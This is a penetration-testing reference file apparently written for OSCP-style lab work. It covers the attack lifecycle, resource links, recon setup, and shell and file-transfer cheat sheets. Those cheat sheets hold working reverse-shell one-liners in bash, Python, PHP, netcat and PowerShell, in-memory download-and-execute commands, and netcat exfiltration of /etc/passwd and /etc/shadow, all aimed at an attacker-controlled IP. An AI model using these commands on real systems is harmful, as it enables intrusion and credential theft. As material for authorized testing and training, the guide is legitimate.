---
id: "00"
title: "PT Lifecycle & Reference Hub"
tags: ["all","reference"]
---
# 00 — PT Lifecycle & Reference Hub

> **Description:** Master orientation file — read this before every engagement.
> **Best For:** Pre-engagement setup, quick reference during any phase, orienting yourself when you're lost.
> **Strength:** Central nervous system of the entire knowledge base. Contains everything you need to start fast and stay organized.

---

## 1. The PT / Red Team Lifecycle

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                        PENETRATION TESTING LIFECYCLE                            │
└─────────────────────────────────────────────────────────────────────────────────┘

  [1] RECONNAISSANCE
       │   Passive: OSINT, WHOIS, Shodan, LinkedIn, DNS records, Google dorks
       │   Active: DNS zone transfer, subdomain brute-force, email harvesting
       │   DONE when: You have a target IP list, open ports picture, tech stack guesses
       ▼
  [2] SCANNING
       │   Full TCP port scan, UDP top ports, service version detection, OS guessing
       │   DONE when: Every open port is identified with service + version
       ▼
  [3] ENUMERATION
       │   Deep-dive every service: banner grab, anonymous access, known misconfigs
       │   DONE when: You have usernames, shares, software versions, web directories
       ▼
  [4] EXPLOITATION
       │   Leverage findings: known CVEs, misconfigs, weak creds, injection points
       │   DONE when: You have a shell (even low-priv) on the target
       ▼
  [5] PRIVILEGE ESCALATION
       │   Linux: sudo, SUID, crons, capabilities, kernel. Windows: tokens, services, registry
       │   DONE when: You are root / NT AUTHORITY\SYSTEM / Domain Admin
       ▼
  [6] LATERAL MOVEMENT
       │   Pivot to other hosts: PTH, PTT, credential reuse, RDP, WinRM, SSH tunneling
       │   DONE when: You've expanded your foothold across the network
       ▼
  [7] POST-EXPLOITATION
       │   Dump creds, map network, maintain access, exfil proof files
       │   DONE when: Proof files captured, hashes dumped, report artifacts collected
       ▼
  [8] REPORTING
           Document: scope, findings, evidence, severity ratings, remediation steps
           DONE when: Client / examiner has a reproducible, evidence-backed report
```

---

## 2. External References

### Reference Wikis

| Resource | URL | Use It For |
| --- | --- | --- |
| **HackTricks** | [book.hacktricks.xyz](https://book.hacktricks.xyz) | Best single reference for any service/vuln — check here first |
| **InternalAllTheThings** | [swisskyrepo.github.io/InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings) | AD attacks, internal PT, lateral movement techniques |
| **PayloadsAllTheThings** | [swisskyrepo.github.io/PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings) | Payloads for every vuln class: SQLi, XSS, LFI, SSTI, etc. |
| **p3ta-tricks** | [p3ta-tricks.com](https://p3ta-tricks.com) | Aggregated offensive tricks and one-liners |

### Live Tools

| Tool | URL | Use It For |
| --- | --- | --- |
| **RevShells** | [revshells.com](https://www.revshells.com) | Generate any reverse shell one-liner, auto-URL-encoded |
| **GTFOBins** | [gtfobins.github.io](https://gtfobins.github.io) | Linux SUID/sudo binary escapes — look up any binary here |
| **LOLBAS** | [lolbas-project.github.io](https://lolbas-project.github.io) | Windows living-off-the-land binaries for execution/transfer/bypass |
| **WADComs** | [wadcoms.github.io](https://wadcoms.github.io) | AD attack command generator — filter by what you have |
| **CyberChef** | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) | Encode, decode, transform anything — base64, hex, URL, etc. |
| **hashes.com** | [hashes.com](https://hashes.com/en/decrypt/hash) | Online hash lookup and cracking · try before you crack locally |

### Exploit Sources

| Source | URL | Use It For |
| --- | --- | --- |
| **Exploit-DB** | [exploit-db.com](https://www.exploit-db.com) | Public exploits — searchsploit pulls from here |
| **NIST NVD** | [nvd.nist.gov](https://nvd.nist.gov) | CVE details, CVSS scores, official descriptions |
| **Packet Storm** | [packetstormsecurity.com](https://packetstormsecurity.com) | Exploits, tools, advisories — sometimes has what ExploitDB misses |

### Cheat Sheets

| Sheet | URL | Use It For |
| --- | --- | --- |
| **PentestMonkey** | [pentestmonkey.net](https://pentestmonkey.net) | Reverse shells, SQL injection, cheat sheets |
| **HighOn.Coffee** | [highon.coffee/blog/penetration-testing-tools-cheat-sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet) | Condensed PT commands for all phases |
| **sushant747 OSCP Guide** | [sushant747.gitbooks.io/total-oscp-guide](https://sushant747.gitbooks.io/total-oscp-guide/content) | OSCP-focused methodology, great for exam prep |

### Practice Platforms

| Platform | URL | Notes |
| --- | --- | --- |
| **OffSec Proving Grounds** | [offsec.com/labs/individual](https://www.offsec.com/labs/individual) | Closest to real OSCP exam machines |
| **HackTheBox** | [hackthebox.com](https://www.hackthebox.com) | Huge variety, active community, good for skills |
| **VulnHub** | [vulnhub.com](https://www.vulnhub.com) | Offline VMs — no internet needed, great for lab practice |
| **TJ Null's OSCP List** | [Google Sheet](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8) | Curated HTB/PG machines that mirror OSCP difficulty |

### OSINT & Recon

| Resource | URL | Use It For |
| --- | --- | --- |
| **OSINT Framework** | [osintframework.com](https://osintframework.com) | A tree of OSINT resources organized by data type and goal |
| **Google Hacking DB (GHDB)** | [exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database) | Ready-made Google dorks for exposed files, panels, and creds |
| **Shodan** | [shodan.io](https://www.shodan.io) | Search internet-exposed devices, services, and versions |
| **DNSDumpster** | [dnsdumpster.com](https://dnsdumpster.com) | Fast DNS recon and subdomain mapping for a target domain |

### Active Directory & Windows

| Resource | URL | Use It For |
| --- | --- | --- |
| **The Hacker Recipes** | [thehacker.recipes](https://www.thehacker.recipes) | Modern AD and Windows attack techniques, densely cross-linked |
| **AD Security** | [adsecurity.org](https://adsecurity.org) | Deep Active Directory attack and defense research |
| **OCD Mindmaps** | [orange-cyberdefense.github.io/ocd-mindmaps](https://orange-cyberdefense.github.io/ocd-mindmaps/) | Visual AD and pentest attack-path maps |
| **BloodHound Docs** | [bloodhound.specterops.io](https://bloodhound.specterops.io) | Cypher queries and attack-path reference for BloodHound |

### Web & API

| Resource | URL | Use It For |
| --- | --- | --- |
| **PortSwigger Web Security Academy** | [portswigger.net/web-security](https://portswigger.net/web-security) | Free, authoritative web-vuln labs and theory |
| **OWASP Web Security Testing Guide** | [owasp.org/wstg](https://owasp.org/www-project-web-security-testing-guide/) | The web-app testing methodology standard |
| **OWASP Cheat Sheet Series** | [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org) | Per-topic attack and defense cheat sheets |
| **OWASP API Security Top 10** | [owasp.org/API-Security](https://owasp.org/API-Security/) | The API-specific vulnerability classes |
| **JWT.io** | [jwt.io](https://jwt.io) | Decode, inspect, and tamper with JSON Web Tokens |

### Cloud

| Resource | URL | Use It For |
| --- | --- | --- |
| **HackTricks Cloud** | [cloud.hacktricks.xyz](https://cloud.hacktricks.xyz) | AWS, Azure, GCP, and Kubernetes attack techniques |
| **Hacking the Cloud** | [hackingthe.cloud](https://hackingthe.cloud) | Offensive AWS techniques, organized by attacker goal |
| **CloudFox** | [github.com/BishopFox/cloudfox](https://github.com/BishopFox/cloudfox) | Enumerate exploitable attack paths across cloud infrastructure |
| **WeirdAAL** | [github.com/carnal0wnage/weirdAAL](https://github.com/carnal0wnage/weirdAAL) | AWS attack library for enumeration and credential abuse |

### AI / LLM Security

| Resource | URL | Use It For |
| --- | --- | --- |
| **OWASP Top 10 for LLM Apps** | [genai.owasp.org](https://genai.owasp.org) | The standard LLM and GenAI vulnerability classes |
| **MITRE ATLAS** | [atlas.mitre.org](https://atlas.mitre.org) | The adversary tactics and techniques matrix for AI systems |
| **PortSwigger: Web LLM Attacks** | [portswigger.net/web-security/llm-attacks](https://portswigger.net/web-security/llm-attacks) | Hands-on labs for attacking LLM-backed web apps |
| **LLM Security Research** | [github.com/greshake/llm-security](https://github.com/greshake/llm-security) | Prompt-injection research and real-world exploit examples |

### Privilege Escalation

| Resource | URL | Use It For |
| --- | --- | --- |
| **PEASS-ng (winPEAS / linPEAS)** | [github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng) | The definitive privesc enumeration scripts |
| **g0tmi1k Linux PrivEsc** | [blog.g0tmi1k.com](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) | The classic Linux privilege-escalation checklist |
| **Priv2Admin** | [github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) | Abusing Windows token privileges up to SYSTEM |
| **WES-NG** | [github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng) | Windows exploit suggester from systeminfo output |

### Methodology & Frameworks

| Resource | URL | Use It For |
| --- | --- | --- |
| **MITRE ATT&CK** | [attack.mitre.org](https://attack.mitre.org) | Adversary tactics and techniques knowledge base |
| **PTES** | [pentest-standard.org](http://www.pentest-standard.org) | Penetration Testing Execution Standard |
| **NIST SP 800-115** | [csrc.nist.gov](https://csrc.nist.gov/pubs/sp/800/115/final) | Technical guide to information security testing |
| **CISA KEV Catalog** | [cisa.gov/kev](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) | CVEs known to be actively exploited in the wild |

---

## 3. Mindset Rules — The 10 Laws

1. **Enumerate more before you exploit.** 90% of the time the path is something you missed, not something you tried. If you've been stuck for 20 minutes, you haven't enumerated enough.

2. **Document as you go.** Screenshot every finding. Log every command. You will not remember what you ran 3 hours later. Your report is built in real-time, not at the end.

3. **Always check UDP.** FTP, SSH, HTTP are obvious. SNMP on 161, TFTP on 69, DNS on 53 — these are UDP and missed by default TCP scans. Run UDP top-1000 on every target.

4. **Version numbers are your best friends.** Every service version is a potential CVE. Copy it into searchsploit and Google before you try anything else.

5. **Try the obvious first.** Default credentials. Anonymous login. Guest shares. Common passwords. Admin/admin. You'd be amazed how often the boring path works.

6. **Re-enumerate when stuck.** Run a new scan. Look at port 631, 873, 2049, 8080, 8443. Check what you dismissed the first time. Run `gobuster` with a different wordlist.

7. **Read the source.** Web app? View source. JS files matter. API endpoints in comments matter. `robots.txt` and `.git` folders matter. Check them all.

8. **Check internal services.** After getting a shell: `ss -tlnp`, `netstat -ano`, `ps aux`. Services running on 127.0.0.1 are invisible externally but are your best PrivEsc leads.

9. **One shell is never enough.** The moment you get a foothold, establish persistence or a second shell before doing anything else. Don't lose access because you closed a terminal.

10. **If it feels like a rabbit hole, it probably is.** CTF and real PT both contain dead ends. Set a 20-minute timer. If no progress, try a completely different vector. Sunk cost kills.

---

## 4. Environment Setup Checklist

Run this every time you connect to a new target network. Takes 5 minutes and saves hours.

```bash
# Step 1: Confirm VPN is up and note your attack IP
ip a show tun0          # or eth0/tap0 depending on platform
export MYIP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo "Attack IP: $MYIP"

# Step 2: Set target IP variable
export TARGET=<TARGET-IP>
echo "Target: $TARGET"

# Step 3: Create organized engagement folder
mkdir -p ~/engagements/$TARGET/{scans,loot,exploits,screenshots,notes}
cd ~/engagements/$TARGET
touch notes/notes.md

# Step 4: Start your note file
cat >> notes/notes.md << EOF
# Target: $TARGET
## Date: $(date)
## Attack IP: $MYIP
---
EOF

# Step 5: Kick off background scan immediately — don't wait
nmap -p- --min-rate 5000 -T4 $TARGET -oA scans/full_tcp &

# Step 6: Quick scan first while full scan runs
nmap -sC -sV -p 21,22,25,53,80,110,111,135,139,143,443,445,3306,3389,5985,8080,8443 $TARGET -oA scans/quick_common

# Step 7: While scans run, check for web presence
curl -I http://$TARGET 2>/dev/null | head -20
curl -I https://$TARGET 2>/dev/null | head -20
```

**Checklist:**
- [ ] VPN connected, tun0 IP confirmed
- [ ] TARGET variable set
- [ ] Engagement folder created
- [ ] Background full TCP scan running
- [ ] Notes file open and timestamped
- [ ] Listening on standard ports ready (nc -lvnp 4444 in separate tmux pane)

---

## 5. Shell Cheat Sheet

### Catching a Shell

```bash
# Standard listener
nc -lvnp 4444

# rlwrap for arrow keys / history in nc
rlwrap nc -lvnp 4444

# Metasploit multi handler (for staged payloads)
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR-IP>; set LPORT 4444; run"
```

### The 8 Essential Reverse Shells

```bash
# 1. Bash TCP
bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1

# 2. Bash TCP (alternate — works when >& is filtered)
bash -c 'exec bash -i &>/dev/tcp/<YOUR-IP>/4444 <&1'

# 3. Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR-IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

# 4. Python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR-IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# 5. PHP (works via webshell or command injection)
php -r '$sock=fsockopen("<YOUR-IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 6. PHP (alternate — shell_exec version)
php -r '$sock=fsockopen("<YOUR-IP>",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# 7. Netcat (when -e flag is available)
nc <YOUR-IP> 4444 -e /bin/bash

# 8. Netcat (mkfifo — when -e is not available)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <YOUR-IP> 4444 >/tmp/f

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<YOUR-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Stabilization (Linux)

**Method 1: Python PTY (most reliable)**
```bash
# On victim:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background

# On attacker:
stty raw -echo; fg
# Press Enter twice

# On victim:
export TERM=xterm
stty rows 38 cols 151      # match your terminal size
```

**Method 2: Script**
```bash
/usr/bin/script -qc /bin/bash /dev/null
# Then do the stty raw -echo; fg dance above
```

**Method 3: socat (best quality — requires socat on victim)**
```bash
# Attacker — start listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim — connect back:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<YOUR-IP>:4444
```

---

## 6. File Transfer Quick Reference

### Attacker → Victim (Push / Serve)

```bash
# Python3 HTTP server (fastest setup)
cd /path/to/files && python3 -m http.server 8080

# impacket SMB server (Windows targets without curl/wget)
impacket-smbserver share $(pwd) -smb2support -user admin -password admin

# Start FTP server
python3 -m pyftpdlib -p 21 -w
```

### Victim → Download

```bash
# Linux: wget
wget http://<YOUR-IP>:8080/file.sh -O /tmp/file.sh

# Linux: curl
curl http://<YOUR-IP>:8080/file.sh -o /tmp/file.sh

# Windows: certutil (always available)
certutil -urlcache -split -f http://<YOUR-IP>:8080/nc.exe C:\Windows\Temp\nc.exe

# Windows: PowerShell wget
(New-Object System.Net.WebClient).DownloadFile("http://<YOUR-IP>:8080/file.exe","C:\Temp\file.exe")

# Windows: PowerShell IEX (execute in memory — no disk write)
IEX(New-Object Net.WebClient).DownloadString("http://<YOUR-IP>:8080/script.ps1")

# Windows: SMB copy
copy \\<YOUR-IP>\share\nc.exe C:\Temp\nc.exe
```

### Victim → Attacker (Exfil)

```bash
# Netcat file exfil
# Attacker listen:
nc -lvnp 9001 > received_file

# Victim send:
nc <YOUR-IP> 9001 < /etc/passwd

# SCP (if SSH available)
scp user@<TARGET-IP>:/etc/shadow ~/loot/shadow

# Base64 encode and paste (no tools needed)
# Victim:
base64 /etc/shadow | tr -d '\n'
# Attacker: paste and decode:
echo "BASE64STRING" | base64 -d > shadow
```

### Transfer Checklist

| Scenario | Best Method |
| --- | --- |
| Linux target, HTTP works | `wget` or `curl` from Python server |
| Windows target, no restrictions | PowerShell `DownloadFile` or `certutil` |
| Windows target, AV present | SMB server + `copy` command |
| No outbound except DNS | DNS exfil (dnscat2) |
| Just need to see file content | `base64` encode → copy/paste |
| Need to run without touching disk | PowerShell `IEX` (in-memory) |
